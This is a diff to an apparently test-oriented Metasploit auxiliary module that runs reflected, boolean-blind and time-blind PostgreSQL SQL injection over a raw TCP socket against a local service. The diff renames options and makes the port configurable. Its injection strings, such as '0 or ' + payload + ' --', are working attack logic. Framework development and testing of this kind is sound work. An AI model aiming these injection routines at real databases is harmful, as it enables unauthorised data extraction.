@@ -28,22 +28,22 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RHOST('127.0.0.1'),
         OptInt.new('RPORT', [true, 'The target port', 1337]),
         OptString.new('TARGETURI', [true, 'The target URI', '/']),
-        OptInt.new('SqliType', [true, '0)Regular. 1) BooleanBlind. 2)TimeBlind', 0]),
-        OptBool.new('Safe', [false, 'Use safe mode', false]),
-        OptString.new('Encoder', [false, 'an encoder to use (hex for example)', '']),
-        OptBool.new('HexEncodeStrings', [false, 'Replace strings in the query with hex numbers?', false]),
-        OptInt.new('TruncationLength', [true, 'Test SQLi with truncated output (0 or negative to disable)', 0])
+        OptInt.new('SQLI_TYPE', [true, '0)Regular. 1) BooleanBlind. 2)TimeBlind', 0]),
+        OptBool.new('SAFE', [false, 'Use safe mode', false]),
+        OptString.new('ENCODER', [false, 'an encoder to use (hex for example)', '']),
+        OptBool.new('HEX_ENCODE_STRINGS', [false, 'Replace strings in the query with hex numbers?', false]),
+        OptInt.new('TRUNCATION_LENGTH', [true, 'Test SQLi with truncated output (0 or negative to disable)', 0])
       ]
     )
   end
 
   def boolean_blind
-    encoder = datastore['Encoder'].empty? ? nil : datastore['Encoder'].intern
+    encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
     sqli = create_sqli(dbms: PostgreSQLi::BooleanBasedBlind, opts: {
                          encoder: encoder,
-                         hex_encode_strings: datastore['HexEncodeStrings']
+                         hex_encode_strings: datastore['HEX_ENCODE_STRINGS']
                        }) do |payload|
-      sock = TCPSocket.open(datastore['RHOST'], 1337)
+      sock = TCPSocket.open(datastore['RHOST'], datastore['RPORT'])
       sock.puts('0 or ' + payload + ' --')
       res = sock.gets.chomp
       sock.close
@@ -57,15 +57,15 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def reflected
-    encoder = datastore['Encoder'].empty? ? nil : datastore['Encoder'].intern
-    truncation = datastore['TruncationLength'] <= 0 ? nil : datastore['TruncationLength']
+    encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
+    truncation = datastore['TRUNCATION_LENGTH'] <= 0 ? nil : datastore['TRUNCATION_LENGTH']
     sqli = create_sqli(dbms: PostgreSQLi::Common, opts: {
                          encoder: encoder,
-                         hex_encode_strings: datastore['HexEncodeStrings'],
+                         hex_encode_strings: datastore['HEX_ENCODE_STRINGS'],
                          truncation_length: truncation,
                          safe: datastore['SAFE']
                        }) do |payload|
-      sock = TCPSocket.open(datastore['RHOST'], 1337)
+      sock = TCPSocket.open(datastore['RHOST'], datastore['RPORT'])
       sock.puts('0 union ' + payload + ' --')
       res = sock.gets.chomp
       sock.close
@@ -79,12 +79,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def time_blind
-    encoder = datastore['Encoder'].empty? ? nil : datastore['Encoder'].intern
+    encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
     sqli = create_sqli(dbms: PostgreSQLi::TimeBasedBlind, opts: {
                          encoder: encoder,
-                         hex_encode_strings: datastore['HexEncodeStrings']
+                         hex_encode_strings: datastore['HEX_ENCODE_STRINGS']
                        }) do |payload|
-      sock = TCPSocket.open(datastore['RHOST'], 1337)
+      sock = TCPSocket.open(datastore['RHOST'], datastore['RPORT'])
       sock.puts('0 or ' + payload + ' --')
       sock.gets
       sock.close
@@ -111,11 +111,15 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    case datastore['SqliType']
-    when 0 then reflected
-    when 1 then boolean_blind
-    when 2 then time_blind
-    else print_bad('Unsupported SQLI_TYPE')
+    case datastore['SQLI_TYPE']
+    when 0
+      reflected
+    when 1
+      boolean_blind
+    when 2
+      time_blind
+    else
+      print_bad('Unsupported SQLI_TYPE')
     end
   end
 end
